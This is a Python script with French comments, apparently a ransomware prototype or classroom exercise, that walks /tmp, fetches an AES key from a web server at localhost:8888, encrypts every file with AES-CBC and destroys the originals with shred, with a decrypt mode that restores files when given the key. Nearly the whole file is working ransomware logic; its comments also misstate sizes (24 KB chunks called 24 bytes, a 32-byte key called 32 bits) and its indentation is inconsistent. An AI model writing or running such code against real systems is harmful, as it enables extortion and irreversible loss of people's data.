from Crypto.Cipher import AES
from Crypto import Random
import os
import random
import struct
import requests
import sys
import subprocess

def encryptFile(key, filename, chunksize=24*1024):
    '''
    Chiffre un fichier en utilisant l'algorithme AES-256
    key : clé utilisé pour le chiffrement de taille 32 bits
    filename : le fichier qu'on souhaite chiffrer
    chunksize : taille de bloc que la fonction va lire, ici on prend des morceaux de 24 octets,
    		ce système permet de chiffrer des fichiers volumineux sans saturer la RAM. 
    '''
    
    #On créer le fichier de sortie chiffré
    out_filename = filename + '.enc'
    
    #On génère un vecteur d'initialisation de 16 octets
    iv = Random.new().read(AES.block_size)

    #On setup la fonction de chiffement avec la clé, le mode et le vecteur d'initialisation
    encryptor = AES.new(key, AES.MODE_CBC, iv)

    #On récupère la taille du fichier orignale
    filesize = os.path.getsize(filename)

    with open(filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - len(chunk)%16)

                outfile.write(encryptor.encrypt(chunk))
    
    

def decryptFile(key, filename, chunksize=24*1024):
    '''
    Déchiffre un fichier
    key : clé utilisé pour déchiffrer
    filename : le fichier qu'on souhaite déchiffrer
    chunksize : taille de bloc que la fonction va lire, ici 24 octets
    '''
    out_filename = filename[:-4]

    with open(filename, 'rb') as infile:
        origsize = struct.unpack('<Q', infile.read(struct.calcsize('Q')))[0]
        iv = infile.read(16)
        decryptor = AES.new(key, AES.MODE_CBC, iv)

        with open(out_filename, 'wb') as outfile:
            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                outfile.write(decryptor.decrypt(chunk))

            outfile.truncate(origsize)


def main(argv):

    # Le dossier à chiffrer
    directory = '/tmp'

    is_decrypt = None

    # récupère la clé en argument si il y en a un
    if len(argv) > 1:
        is_decrypt = True
        key = bytes(argv[1], 'utf-8')

    # récupère tous les fichiers présents dans directory
    for root, dirs, files in os.walk(directory, topdown=False):
       for name in files:
            file = os.path.join(root, name)

            # déchiffrement
            if is_decrypt:
                if file[-4:] == ".enc":
                    decryptFile(key, file)
	            #utilisation de commande bash shred pour supprimer de manière sécurisé les fichiers .enc
                    subprocess.check_output(["shred", "-uz", file])

            # chiffrement
            else:
                if file[-4:] != ".enc": 
		    #faire une requête get au serveur web pour récupérer la clé
    		    url = 'http://localhost:8888/key.txt'
    		    resp = requests.get(url)
    		    key= resp.text
    	     	    key= key.rstrip("\n")
    		    key= key.encode('utf-8')
		    #chiffrement
                    encryptFile(key, file)
                    #utilisation de commande bash shred pour supprimer de manière sécurisé les fichiers d'origine
                    subprocess.check_output(["shred", "-uz", file])

    
    '''supprime de la variable et donc la référence à la zone mémoire ou est stocké la valeur de la key, il n'y plus de référence à cette valeur.
    Python via l'algo garbage collection détruit cette zone mémoire pour la réalouer à un nouvelle objet.
    La garbage collection a deux façon de fonctionner: comptage de références et générationnel. 
    - Si le nombre de références d'un objet atteint 0, l'algorithme de comptage de références nettoit la zone mémoire de l'objet.
    - Si il y a un cycle, l'algorithme de références est inefficace, c'est l'algorithme générationnel qui nettoie la zone mémoire
    '''
    del key

if __name__ == '__main__':
    main(sys.argv)
